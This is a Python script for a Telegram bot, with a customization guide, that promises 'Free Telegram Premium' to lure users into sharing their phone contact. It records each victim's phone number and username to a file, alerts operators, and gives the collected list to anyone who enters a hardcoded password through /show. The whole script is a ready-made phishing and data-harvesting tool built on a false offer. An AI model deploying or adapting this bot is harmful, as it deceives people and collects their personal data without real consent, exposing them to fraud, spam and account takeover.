#    _____                  __   __      __  _____         __             .___
#   /     \   ____  _______/  |_/  \    /  \/  |  |  _____/  |_  ____   __| _/
#  /  \ /  \ /  _ \/  ___/\   __\   \/\/   /   |  |_/    \   __\/ __ \ / __ | 
# /    Y    (  <_> )___ \  |  |  \        /    ^   /   |  \  | \  ___// /_/ | 
# \____|__  /\____/____  > |__|   \__/\  /\____   ||___|  /__|  \___  >____ | 
#         \/           \/              \/      |__|     \/          \/     \/ 

"""
CUSTOMIZATION GUIDE:
1. Bot Token: Replace the token in main() function with your bot token from @BotFather
2. Welcome Message: Modify WELCOME_CAPTION below to change the bot's greeting message
3. Button Text: Change the text in KeyboardButton inside send_welcome_message() function
4. Picture: Replace 'telegramicon.png' with your own image file (keep the same filename or update it in the code)
5. Password: Change the 'password' variable below to set your own password for the /show command
"""

import glob
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
import logging

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Dictionary to store user data
user_data = {}

# Password for accessing the /show command
# CUSTOMIZE: Change this password to your desired value
password = '4422'

# You Bot Token
BOT_TOKEN = "" # add here

# Track the message IDs for deleting and resending
message_ids = {'start': None, 'premium': None}

# CUSTOMIZE: Modify this message to change what users see when they start the bot
WELCOME_CAPTION = ("🎉 Welcome to Free Telegram Premium 🎉\n\n"
                  "You can get 3 months of Telegram Premium for free!\n\n"
                  "To Get ⭐Free Premium Telegram ⭐ Access\n\n please press the box icon button \n\nnear the clip 🧷\n\n below to connect your account to Telegram Pro. 📱\n\n"
                  "Happy Using And Keep Coming Back Every 3 Months! 😊")

def send_welcome_message(chat_id, bot=None, update=None) -> int:
    """Helper function to send welcome message with photo and buttons"""
    # CUSTOMIZE: Modify the button text here
    button_text = "⭐️ Get Free 3 months Telegram Premium"
    
    reply_markup = ReplyKeyboardMarkup(
        [[KeyboardButton(text=button_text, request_contact=True)]],
        one_time_keyboard=True,
        resize_keyboard=True
    )

    # CUSTOMIZE: Replace 'telegramicon.png' with your own image file
    # Make sure the image file is in the same directory as this script
    with open('telegramicon.png', 'rb') as photo:
        if bot:
            sent_message = bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=WELCOME_CAPTION,
                reply_markup=reply_markup
            )
        else:
            sent_message = update.message.reply_photo(
                photo=photo,
                caption=WELCOME_CAPTION,
                reply_markup=reply_markup
            )
    return sent_message.message_id

def start(update: Update, context: CallbackContext) -> None:
    try:
        message_ids['start'] = send_welcome_message(update.effective_chat.id, update=update)
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        update.message.reply_text("An error occurred while processing your request.")

# Add a dictionary to store users who entered the correct password
authorized_users = {}

def notify_users_of_new_user(phone_number: str):
    """Notify all users who entered the correct password about a new user."""
    for user_id in authorized_users:
        try:
            message = (f"🚨 A new user has shared their phone number:\n"
                       f"📱 {phone_number}\n"
                       f"Check out the list of users in /show if you're authorized.")
            context.bot.send_message(user_id, message)
        except Exception as e:
            logger.error(f"Error sending message to user {user_id}: {e}")

def handle_contact(update: Update, context: CallbackContext) -> None:
    """Handle the contact message and notify the user that they will be notified of new users."""
    contact = update.message.contact
    user_id = update.message.from_user.id
    username = update.message.from_user.username

    # Check if the user has already shared their phone number
    if user_id in user_data:
        update.message.reply_text(f"🚫 @{username}, you have already shared your phone number. You should receive premium access shortly. 🚀")
        return

    # Save the user's data
    user_data[user_id] = {
        'username': username,
        'phone_number': contact.phone_number
    }

    # Save user data to file (append mode to avoid overwriting)
    with open('user_data.txt', 'a') as file:
        file.write(f"User ID: {user_id}\nUsername: @{username}\nPhone Number: {contact.phone_number}\n\n")

    # Notify the user that they will be notified of new users
    update.message.reply_text(f"Thank you @{username}! Your phone number has been recorded. 😊\n\nYou will be notified whenever a new user shares their phone number. 📲")

    # Notify all authorized users about the new phone number
    notify_users_of_new_user(contact.phone_number)


def show_users(update: Update, context: CallbackContext) -> None:
    """Show the list of users to authorized users."""
    if len(context.args) == 0 or context.args[0] != password:
        update.message.reply_text(
            "❌ Access denied. Please provide the correct password to view the list of users. Usage: /show <password>"
        )
        return

    # Add the user to the authorized list
    user_id = update.message.from_user.id
    authorized_users[user_id] = True

    # Send the user data file directly
    try:
        update.message.reply_document(
            document=open('user_data.txt', 'rb'),
            filename="user_data.txt",
            caption="📜 Here is the list of users who shared their information."
        )
    except FileNotFoundError:
        update.message.reply_text("No user data file found. 😔")
    except Exception as e:
        logger.error(f"An error occurred while retrieving user data: {e}")
        update.message.reply_text("An error occurred while retrieving the user data. 😔")



def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    if query.data == "get_premium":
        # Delete the current message (if any)
        if message_ids['premium']:
            context.bot.delete_message(chat_id=update.effective_chat.id, message_id=message_ids['premium'])

        # Delete the original start message
        if message_ids['start']:
            context.bot.delete_message(chat_id=update.effective_chat.id, message_id=message_ids['start'])

        # Re-send the welcome message
        message_ids['start'] = send_welcome_message(update.effective_chat.id, bot=context.bot)
        message_ids['premium'] = None


def main() -> None:
    # CUSTOMIZE: Replace with your bot token from @BotFather
    updater = Updater(BOT_TOKEN)

    dispatcher = updater.dispatcher

    # Handlers for different commands
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(MessageHandler(Filters.contact, handle_contact))
    dispatcher.add_handler(CommandHandler("show", show_users))
    dispatcher.add_handler(CallbackQueryHandler(button))

    # Start the Bot
    updater.start_polling()
    updater.idle()


if __name__ == '__main__':
    main()
